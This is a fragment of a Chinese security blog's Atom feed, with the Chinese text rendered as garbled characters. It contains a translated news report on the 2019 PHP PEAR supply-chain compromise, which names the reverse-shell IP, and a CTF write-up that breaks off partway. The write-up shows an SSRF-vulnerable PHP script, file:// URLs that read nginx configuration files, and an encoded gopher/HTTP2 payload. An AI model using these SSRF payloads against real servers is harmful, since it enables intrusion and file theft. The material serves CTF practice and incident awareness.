      <category term="ParrotOS" scheme="http://www.yof3ng.xyz/tags/ParrotOS/"/>
    
  </entry>
  
  <entry>
    <title>php_pear_was_attacked</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/php-pear-was-attacked/</id>
    <published>2019-01-31T09:06:06.000Z</published>
    <updated>2019-04-02T08:45:35.743Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><blockquote><p>ËØëÊñáÂ£∞ÊòéÔºö</p><p>Êú¨ÊñáÊòØÁøªËØëÊñáÁ´†ÔºåÊñáÁ´†Âéü‰ΩúËÄÖ<a href="https://thehackernews.com/p/authors.html" target="_blank" rel="noopener">Mohit Kumar</a>ÔºåÊñáÁ´†Êù•Ê∫êÔºö<a href="https://thehackernews.com/2019/01/php-pear-hacked.html" target="_blank" rel="noopener">https://thehackernews.com/2019/01/php-pear-hacked.html</a></p></blockquote><h1 id="PHP-PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ"><a href="#PHP-PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ" class="headerlink" title="PHP PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ"></a>PHP PEARÁΩëÁ´ôË¢´Èªë‰∏îÂÖ∂ÂÆòÊñπËΩØ‰ª∂ÂåÖÁÆ°ÁêÜÂô®Ë¢´ÊÅ∂ÊÑèÁØ°Êîπ</h1><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130104752.png" alt=""></p><blockquote><p>Â∞èÂøÉÔºÅÂ¶ÇÊûúÊÇ®Âú®ËøáÂéª6‰∏™ÊúàÂÜÖ‰ªéPHPÂÆòÊñπÁΩëÁ´ô‰∏ãËΩΩ‰∫ÜPHP PEARÂåÖÁÆ°ÁêÜÂô®ÔºåÊàë‰ª¨Âè™ËÉΩÂæàÈÅóÊÜæÂØπÊÇ®ËØ¥ÊÇ®ÁöÑÊúçÂä°Âô®ÂèØËÉΩÂ∑≤ÁªèÊàê‰∏∫ËÇâÈ∏°„ÄÇ</p></blockquote><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>‰∏äÂë®ÔºåPEARÁöÑÁª¥Êä§‰∫∫ÂëòÂèëÁé∞Êúâ‰∫∫<strong>ÊÅ∂ÊÑèÊõøÊç¢‰∫ÜÂéüÊù•ÁöÑPHP PEARÂåÖÁÆ°ÁêÜÂô®Ôºàgo-pear.pharÔºâ</strong>Ôºå‰∏îÈªëÂÆ¢Âú®Ê†∏ÂøÉPEARÊñá‰ª∂Á≥ªÁªü‰∏≠‰ΩøÁî®‰∫ÜÁØ°ÊîπÂêéÁöÑÁâàÊú¨ÔºåÂú®Ê≠§‰πãÂêéÁª¥Êä§‰∫∫ÂëòËøÖÈÄüÂÖ≥Èó≠‰∫ÜPEARÁöÑÂÆòÊñπÁΩëÁ´ôÔºàpear-php.netÔºâ„ÄÇ</p><p>Â∞ΩÁÆ°PEARÂºÄÂèë‰∫∫ÂëòËøòÂú®ÂàÜÊûêÊÅ∂ÊÑèÁ®ãÂ∫èÂåÖÔºå‰ΩÜÂõ¢ÈòüÂú®2019Âπ¥1Êúà19Êó•ËøÖÈÄüÂèëÂ∏ÉÁöÑÂÆâÂÖ®ÂÖ¨ÂëäËØÅÂÆûÔºåË¢´ÈªëÂÆ¢ÂÖ•‰æµÁöÑÁΩëÁ´ôÊúçÂä°ÊîæÁΩÆ‰∫ÜÂèóÊÅ∂ÊÑè‰ª£Á†ÅÊ±°ÊüìÁöÑÂÆâË£ÖÊñá‰ª∂Ëá≥Â∞ëÂçäÂπ¥‰πã‰πÖÔºåÂèØÊÉ≥ËÄåÁü•ÊúâÂ§öÂ∞ë‰∫∫‰∏ãËΩΩ‰∫ÜË¢´Ê±°ÊüìÁöÑÂÆâË£ÖÂåÖ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130105824.png" alt=""></p><h2 id="PHP-PEARÊòØ‰ªÄ‰πàÔºü"><a href="#PHP-PEARÊòØ‰ªÄ‰πàÔºü" class="headerlink" title="PHP-PEARÊòØ‰ªÄ‰πàÔºü"></a>PHP-PEARÊòØ‰ªÄ‰πàÔºü</h2><p>PHPÊâ©Â±ïÂíåÂ∫îÁî®Á®ãÂ∫èÂ≠òÂÇ®Â∫ìÔºàPEARÔºâÊòØ‰∏Ä‰∏™Á§æÂå∫È©±Âä®ÁöÑÊ°ÜÊû∂ÂíåÂàÜÂèëÁ≥ªÁªüÔºåÂÆÉ‰ΩøÂæó‰ªª‰Ωï‰∫∫ÈÉΩÂèØ‰ª•ÊêúÁ¥¢Âíå‰∏ãËΩΩ‰ΩøÁî®PHPÁºñÁ®ãËØ≠Ë®ÄÁºñÂÜôÁöÑÂÖçË¥πÂ∫ì„ÄÇËøô‰∫õÂºÄÊ∫êÂ∫ìÔºàÊàñËÆ∏Áß∞‰πã‰∏∫ËΩØ‰ª∂ÂåÖÊõ¥‰∏∫ÊÅ∞ÂΩìÔºâÂÖÅËÆ∏ÂºÄÂèë‰∫∫ÂëòÂú®ÂÖ∂È°πÁõÆÂíåÁΩëÁ´ô‰∏≠ËΩªÊùæÊ∑ªÂä†ÂÖ∂‰ªñÂäüËÉΩÔºåÂåÖÊã¨Ë∫´‰ªΩÈ™åËØÅÔºåÁºìÂ≠òÔºåÂä†ÂØÜÔºåWebÊúçÂä°Á≠âÁ≠â„ÄÇ</p><p>ÂΩìÊÇ®‰∏ãËΩΩÁî®‰∫éUnix / Linux / BSDÁ≥ªÁªüÁöÑPHPËΩØ‰ª∂Êó∂ÔºåPEAR‰∏ãËΩΩÁÆ°ÁêÜÂô®Ôºàgo-pear.pharÔºâÂ∑≤È¢ÑÂÖàÂÆâË£ÖÔºåËÄåWindowsÂíåMac OS XÁî®Êà∑Âú®ÂøÖË¶ÅÁöÑÊó∂‰æØÈúÄÊâãÂä®ÂÆâË£ÖËØ•ÁªÑ‰ª∂„ÄÇ</p><p>Áî±‰∫éËÆ∏Â§öÁΩëÁªúÊâòÁÆ°ÂÖ¨Âè∏ÔºàÂåÖÊã¨ÂÖ±‰∫´ÊâòÁÆ°ÊúçÂä°Êèê‰æõÂïÜÔºâ‰πüÂÖÅËÆ∏ÂÖ∂Áî®Êà∑ÂÆâË£ÖÂíåËøêË°åPEARÔºåÂõ†Ê≠§ËøôÁßçÊúÄÊñ∞ÁöÑÂÆâÂÖ®ÊºèÊ¥ûÂèØËÉΩ‰ºö<strong>ÂΩ±ÂìçÂ§ßÈáèÁΩëÁ´ôÂèäÂÖ∂ËÆøÈóÆËÄÖ</strong>„ÄÇ</p><h2 id="PEAR-Âõ¢ÈòüÂ£∞Êòé"><a href="#PEAR-Âõ¢ÈòüÂ£∞Êòé" class="headerlink" title="PEAR Âõ¢ÈòüÂ£∞Êòé"></a>PEAR Âõ¢ÈòüÂ£∞Êòé</h2><blockquote><p>‚ÄúÂ¶ÇÊûúÊÇ®Âú®ËøáÂéªÂÖ≠‰∏™Êúà‰πãÂÜÖÂ∑≤Áªè‰∏ãËΩΩ‰∫ÜËøô‰∏™<code>go-pear.phar</code>ÔºåÈÇ£‰πàÊÇ®Â∫îËØ•‰ªé<code>GitHubÔºàpear / pearweb_pharsÔºâ</code>Ëé∑ÂèñÁõ∏ÂêåÂèëË°åÁâàÊú¨ÁöÑÊñ∞ÂâØÊú¨Âπ∂ÊØîËæÉÂÖ∂Êñá‰ª∂ÂìàÂ∏åÂÄº„ÄÇÂ¶ÇÊûú‰∏çÂêåÔºåÊÇ®ÂèØËÉΩ‰ºöÊúâÂÆâË£ÖÂèóÊÑüÊüìÁöÑÊñá‰ª∂ÁöÑÈ£éÈô©‚ÄùÔºåPEARÂÆòÊñπÁΩëÁ´ô‰∏äÁöÑËØ¥ÊòéÂ¶Ç‰∏ä„ÄÇ</p></blockquote><p>Ê†πÊçÆPEARÁª¥Êä§‰∫∫ÂëòÁöÑËØ¥Ê≥ïÔºåËØ•Âõ¢ÈòüÁõÆÂâçÊ≠£Âú®ËøõË°åËøΩË∏™„ÄÅÊ∫ØÊ∫êË∞ÉÊü•Ôºå‰ª•Á°ÆÂÆöÊîªÂáªÁöÑÁ®ãÂ∫¶‰ª•ÂèäÊîªÂáªËÄÖÊòØÂ¶Ç‰ΩïÂú®Ëøô‰πàÊó©ÁöÑÊó∂ÊúüÂ∞±ËÉΩÂ§üÊîªÁ†¥ÊúçÂä°Âô®„ÄÇ</p><p>ËÄåÁé∞Âú®ÂèØ‰ª•Âú®Github‰∏äËé∑ÂèñÂà∞ÂáÄÂåñÂêéÁöÑÁâàÊú¨<code>pearweb_phars-1.10.10</code>ÔºåÊ≠§ÂâçÂú®ÊúçÂä°Âô®<code>httpÔºö//pear.php.net</code>‰∏äÂèóÂà∞Ê±°ÊüìÁöÑÁâàÊú¨ÊòØ<code>v1.10.9</code>ÔºåPEARÂõ¢Èòü‰πüÈáçÊñ∞ÂèëÂ∏É‰∫ÜÊú™ÂèóÊ±°ÊüìÁöÑ<code>go-pear.phar-v1.10.9</code>ÔºåÂπ∂‰∏î‰ºöÂåÖÂê´ÊúâÊØè‰∏™‰∏çÂêå<code>phar</code>ÁöÑÂçïÁã¨GPGÁ≠æÂêçÊñá‰ª∂ÔºåÁî®‰ª•È™åÊòéÂÖ∂Ê≠£Á°ÆÊÄß„ÄÇ</p><p>ÂêéÊù•ÂºÄÂèë‰∫∫ÂëòËøõË°å‰∫ÜËøõ‰∏ÄÊ≠•ÁöÑÈÄöÁü•ËØ¥ÊòéÔºåËØÅÂÆûÂè™Êúâ<code>http://pear.php.net</code>ÊúçÂä°Âô®‰∏äÁöÑÂâØÊú¨ÂèóÂà∞‰∫ÜÂΩ±ÂìçÔºåËÄå‰∏î<code>go-pear.phar</code>ÁöÑGitHubÂâØÊú¨Âπ∂Ê≤°ÊúâÊõøÊç¢‰∏∫Ê±°ÊüìÂêéÁöÑÊñá‰ª∂„ÄÇ</p><p>Âõ†Ê≠§ÊâÄÊúâÂú®ËøáÂéªÂÖ≠‰∏™ÊúàÂÜÖ‰ªéÂÆòÊñπÁΩëÁ´ô‰∏ãËΩΩËøáÂÆâË£ÖÊñá‰ª∂<code>go-pear.phar</code>ÁöÑPHP / PEARÁî®Êà∑<strong>ÈÉΩÂ∫îËØ•ËÆ§ËØÜ</strong>Âà∞Ëá™Â∑±ÊúâË¢´ÈªëÂÆ¢‰æµÂÆ≥ÁöÑÈ£éÈô©ÔºåÂπ∂‰∏îÊúÄÂ•ΩÊõøÊç¢Êñá‰ª∂‰∏∫Github‰∏äÁöÑÁ∫ØÂáÄÁâàÊú¨„ÄÇ</p><h2 id="PEAR-Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ"><a href="#PEAR-Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ" class="headerlink" title="PEAR Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ"></a>PEAR Âõ¢ÈòüÈíàÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÈÉ®ÂàÜË∞ÉÊü•‰ø°ÊÅØ</h2><p><strong>Êõ¥Êñ∞</strong> -  PEARÂõ¢ÈòüÂèëÂ∏É‰∫ÜÊúâÂÖ≥ÊúÄËøëÂÆâÂÖ®‰∫ã‰ª∂ÁöÑÊõ¥Â§öËØ¶ÁªÜ‰ø°ÊÅØÔºåËß£Èáä‰∫ÜÂú®2018Âπ¥12Êúà20Êó•ÊúÄÂêé‰∏ÄÊ¨°Ê≠£ÂºèÊñá‰ª∂ÂèëÂ∏ÉÂêéÔºåÂÖ∂ÊúçÂä°Âô®‰∏äÂèëÁé∞<code>go-pear.phar</code>Ë¢´Ê±°ÊüìÁöÑËØ¶ÁªÜÁä∂ÂÜµ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190130111806.png" alt=""></p><p>PEAR Âõ¢ÈòüÂú®ÂàÜÊûê‰∫ÜÂåÖÁÆ°ÁêÜÂô®ÁöÑÊ±°ÊüìÁâàÊú¨Êñá‰ª∂‰πãÂêéÔºåÂèëÁé∞ÊÅ∂ÊÑè‰ª£Á†ÅÊ®°Âùó<code>ÈÄöËøáPerlÂêëIP 104.131.154.154ÁîüÊàêÂèçÂêëshell</code>ÔºåËøôÊÑèÂë≥ÁùÄÂèóÊÑüÊüìÁöÑÊúçÂä°Âô®Â∞ÜÁîüÊàêÂêéÈó®ÔºåÂÖÅËÆ∏ÊîªÂáªËÄÖÂÆåÂÖ®ÊéßÂà∂ÂÆÉ‰ª¨ÔºåÂåÖÊã¨ÂÆâË£ÖÂ∫îÁî®Á®ãÂ∫èÔºåËøêË°åÊÅ∂ÊÑè‰ª£Á†ÅÔºåÁ™ÉÂèñÊïèÊÑüÊï∞ÊçÆÁöÑËÉΩÂäõ„ÄÇ</p><p>Ê†πÊçÆ<a href="https://blog.dcso.de/php-pear-software-supply-chain-attack/" target="_blank" rel="noopener">DCSO‰∏äÂæ∑ÂõΩÁΩëÁªúÂÆâÂÖ®ÁªÑÁªáÂØπÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÁöÑÂàÜÊûêÊä•Âëä</a>ÂæóÁü•ÔºöÊúçÂä°Âô®IPÂú∞ÂùÄ<code>104.131.154.154</code>ÊåáÂêë‰∏Ä‰∏™webÂüüÂêç<code>bestlinuxgames [.] com</code>ÔºåËØ•ÊúçÂä°Âô®Ë¢´ËÆ§‰∏∫ÊòØÈªëÂÆ¢‰ΩøÁî®ÁöÑ‰∏ÄÂè∞ÂèóÊÑüÊüìÂêé‰∏ªÊú∫ÔºàËÇâÈ∏°/C2ÊúçÂä°Âô®Ôºâ„ÄÇ</p><blockquote><p>‚ÄúËØ•IPÂ∑≤Ë¢´ËØÅÂÆû‰∏éÊ≠§Ê¨°‰æõÂ∫îÈìæÊ±°ÊüìÊúâÂÖ≥Ôºå‰ΩÜÊ≤°ÊúâÂèëÁé∞ÂÖ∂‰ªñËøùËßÑË°å‰∏∫„ÄÇ<code>install-pear-nozlib.phar</code>ËΩØ‰ª∂ÂåÖÊòØÊ≠£Â∏∏ÁöÑÔºåGitHub‰∏äÁöÑ<code>go-pear.phar</code>Êñá‰ª∂‰πüÊòØÊ≠£Â∏∏ÁöÑÔºåÂèØ‰ª•Â∞Ü‰ªª‰ΩïÂèØÁñëÁöÑÊ†∑Êú¨ÂìàÂ∏å‰∏éÊ≠£Á°ÆÁöÑMD5ÂÄºËøõË°åÊ†°È™å„ÄÇ‚ÄùÔºõ</p><p>‚ÄúÂõ†Ê≠§ÔºåÂÅáÂ¶ÇÊÇ®Âú®12/20‰πãÂâç‰∏ãËΩΩ‰∫Ü<code>go-pear.phar</code>Áî®‰ª•Âú®ÊÇ®ÁöÑÁ≥ªÁªü‰∏äÂÆâË£ÖPEARÂåÖÔºåÈÇ£‰πàÊÇ®<strong>Â∫îËØ•ÊãÖÂøÉ</strong>Ëá™Â∑±ÊòØÂê¶‰ºöÊàê‰∏∫ËÇâÈ∏°ÔºåÁâπÂà´ÊòØÂΩìÊÇ®ÁöÑÁ≥ªÁªüÂÖ∑ÊúâÂèØÁî®ÁöÑ<code>sh</code>Âíå<code>perl</code>ÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨Âπ∂Ê≤°ÊúâÂÖ∑‰ΩìËØÅÊçÆÂéªÁ°ÆËÆ§ÊÇ®ÊòØÂê¶‰∏ãËΩΩ‰∫ÜË¢´ÊÑüÊüìÁöÑÊñá‰ª∂Ôºå‰ΩÜ‰øùÈô©Ëµ∑ËßÅËøòÊòØÂ∏åÊúõÊÇ®ËÉΩÂ•ΩÂ•ΩÊ£ÄÊü•‰∏Ä‰∏ãÊÇ®ÁöÑÁ≥ªÁªü„ÄÇ‚ÄùÔºõ</p><p>‚ÄúÂè¶Â§ñËøòÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËøô‰∏ç‰ºöÊ±°Êüì‰ΩøÁî®PEARÂÆâË£ÖÁöÑÁ®ãÂ∫èÂåÖ‚Ä¶ÂÆÉÊ±°ÊüìÁöÑÊòØÂàùÂßãÂÆâË£ÖPEARÂÆâË£ÖÁ®ãÂ∫èÁöÑ<code>go-pear.phar</code>ÂèØÊâßË°åÊñá‰ª∂ÔºåÂç≥‰ΩøÁî®<code>pear</code>ÂëΩ‰ª§ÂÆâË£ÖÁöÑÂêÑÁßçPEARÂåÖ<strong>‰∏çÂèó</strong>ÂΩ±Âìç„ÄÇ‚ÄùÔºõ</p><p>PEAR Âõ¢ÈòüÂú®‰∏ÄÁ≥ªÂàóÊé®Êñá‰∏≠ÁöÑË°®Á§∫Â¶Ç‰∏ä„ÄÇ</p></blockquote><p>PSÔºöÂΩì‰ªäÁöÑ‰æõÂ∫îÈìæÊ±°Êüì‰∫ã‰ª∂Ë∂äÊù•Ë∂äÂ§öÔºåË∞®ÊÖéÂ∞èÂøÉÊñπËÉΩÈ©∂Âæó‰∏áÂπ¥Ëàπ„ÄÇ</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="ËØëÊñá" scheme="http://www.yof3ng.xyz/categories/%E8%AF%91%E6%96%87/"/>
    
    
      <category term="ÁΩëÁªúÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
      <category term="ËµÑËÆØ" scheme="http://www.yof3ng.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
    
      <category term="ËØëÊñá" scheme="http://www.yof3ng.xyz/tags/%E8%AF%91%E6%96%87/"/>
    
  </entry>
  
  <entry>
    <title>ssrf_by_http2_and_gopher</title>
    <link href="http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/"/>
    <id>http://www.yof3ng.xyz/2019/01/31/ssrf-by-http2-and-gopher/</id>
    <published>2019-01-31T09:05:24.000Z</published>
    <updated>2019-04-02T08:46:31.127Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="pwnhub-pink-friend"><a href="#pwnhub-pink-friend" class="headerlink" title="pwnhub-pink-friend"></a>pwnhub-pink-friend</h1><blockquote><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><p><a href="http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/" target="_blank" rel="noopener">http://f1sh.site/2019/01/30/pwnhub-pink-friend-writeup/</a></p><p><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank" rel="noopener">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a></p></blockquote><p>È¢òÁõÆÈìæÊé•Ôºö<a href="https://40.73.33.181/index.php" target="_blank" rel="noopener">https://40.73.33.181/index.php</a></p><p>source code:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Can not parse url: '</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span> <span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>ÂÖàssrfËØªnginxÈÖçÁΩÆÊñá‰ª∂Ôºö</p><ul><li>/etc/nginx/nginx.conf</li><li>/etc/nginx/sites-enabled/default</li><li>/var/log/nginx/access.log;</li><li>/var/log/nginx/error.log</li></ul><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/sites-enabled/default</code></p><p><code>view-source:https://40.73.33.181/index.php?url=file:///etc/nginx/nginx.conf</code></p><pre class=" language-nginx"><code class="language-nginx"><span class="token keyword">user</span> www<span class="token operator">-</span>data<span class="token punctuation">;</span><span class="token keyword">worker_processes</span> auto<span class="token punctuation">;</span><span class="token keyword">pid</span> <span class="token operator">/</span>run<span class="token operator">/</span>nginx<span class="token punctuation">.</span><span class="token keyword">pid</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>modules<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span><span class="token keyword">events</span> <span class="token punctuation">{</span>    <span class="token keyword">worker_connections</span> <span class="token number">768</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># multi_accept on;</span><span class="token punctuation">}</span><span class="token keyword">http</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Basic Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">sendfile</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nopush</span> on<span class="token punctuation">;</span>    <span class="token keyword">tcp_nodelay</span> on<span class="token punctuation">;</span>    <span class="token keyword">keepalive_timeout</span> <span class="token number">65</span><span class="token punctuation">;</span>    <span class="token keyword">types_hash_max_size</span> <span class="token number">2048</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># server_tokens off;</span>    <span class="token comment" spellcheck="true"># server_names_hash_bucket_size 64;</span>    <span class="token comment" spellcheck="true"># server_name_in_redirect off;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>mime<span class="token punctuation">.</span><span class="token keyword">types</span><span class="token punctuation">;</span>    <span class="token keyword">default_type</span> application<span class="token operator">/</span>octet<span class="token operator">-</span>stream<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># SSL Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">ssl_protocols</span> TLSv1 TLSv1<span class="token number">.1</span> TLSv1<span class="token number">.2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># Dropping SSLv3, ref: POODLE</span>    <span class="token keyword">ssl_prefer_server_ciphers</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Logging Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">access_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token keyword">error_log</span> <span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span>error<span class="token punctuation">.</span>log<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Gzip Settings</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">gzip</span> on<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true"># gzip_vary on;</span>    <span class="token comment" spellcheck="true"># gzip_proxied any;</span>    <span class="token comment" spellcheck="true"># gzip_comp_level 6;</span>    <span class="token comment" spellcheck="true"># gzip_buffers 16 8k;</span>    <span class="token comment" spellcheck="true"># gzip_http_version 1.1;</span>    <span class="token comment" spellcheck="true"># gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token comment" spellcheck="true"># Virtual Host Configs</span>    <span class="token comment" spellcheck="true">##</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span>conf<span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>sites<span class="token operator">-</span>enabled<span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">#server {</span>    <span class="token comment" spellcheck="true">#    listen 8080</span>    <span class="token comment" spellcheck="true">#    location /flag {</span>    <span class="token comment" spellcheck="true">#        proxy_pass 172.20.0.3:8080</span>    <span class="token comment" spellcheck="true">#    }</span>    <span class="token comment" spellcheck="true">#}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#mail {</span><span class="token comment" spellcheck="true">#    # See sample authentication script at:</span><span class="token comment" spellcheck="true">#    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    # auth_http localhost/auth.php;</span><span class="token comment" spellcheck="true">#    # pop3_capabilities "TOP" "USER";</span><span class="token comment" spellcheck="true">#    # imap_capabilities "IMAP4rev1" "UIDPLUS";</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:110;</span><span class="token comment" spellcheck="true">#        protocol   pop3;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true"># </span><span class="token comment" spellcheck="true">#    server {</span><span class="token comment" spellcheck="true">#        listen     localhost:143;</span><span class="token comment" spellcheck="true">#        protocol   imap;</span><span class="token comment" spellcheck="true">#        proxy      on;</span><span class="token comment" spellcheck="true">#    }</span><span class="token comment" spellcheck="true">#}</span></code></pre><p>ÁÑ∂ÂêéÂèØ‰ª•‰ªénginx.confÂæóÁü•flagÁ∫øÁ¥¢<code>172.20.0.3:8080</code>ÔºåÈÄöËøágopherÂçèËÆÆÊûÑÈÄ†Á¨¶ÂêàHTTP2ÁöÑpayloadËÆøÈóÆÊåáÂÆöÂú∞ÂùÄÔºåËé∑ÂèñËøîÂõûÁöÑHTTP2ÁöÑÂéüÁîüÊï∞ÊçÆÔºàÈúÄË¶Å‰∫ÜËß£<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">HTTP2</a>‰ª•Âèä<a href="https://www.codercto.com/a/34433.html" target="_blank" rel="noopener">gopherÂçèËÆÆ</a>ÁöÑÁü•ËØÜÔºâ„ÄÇ</p><pre class=" language-payload"><code class="language-payload">--payload:/index.php?url=gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%2500%2504%2500%2500%2500%2500%2500%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9</code></pre><p>ËøîÂõûÁöÑÊï∞ÊçÆ:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190131000835.png" alt=""></p><p>ÂèØ‰ª•Â∞ÜËøîÂõûÁöÑÊï∞ÊçÆÊåâHTTP2ÂçèËÆÆÁöÑÊ†ºÂºèËß£ÊûêÔºåÊàñËÄÖÂà©Áî®‰∏ÄÁßçÂ∑ßÂ¶ôÁöÑÊñπÊ≥ïÔºåÂç≥ÊääËøîÂõûÊï∞ÊçÆÊîæÂú®‰ΩøÁî®socketÊ®°ÊãüÁöÑÊúçÂä°Âô®‰∏äÔºåÁõ¥Êé•Áî®<code>curl 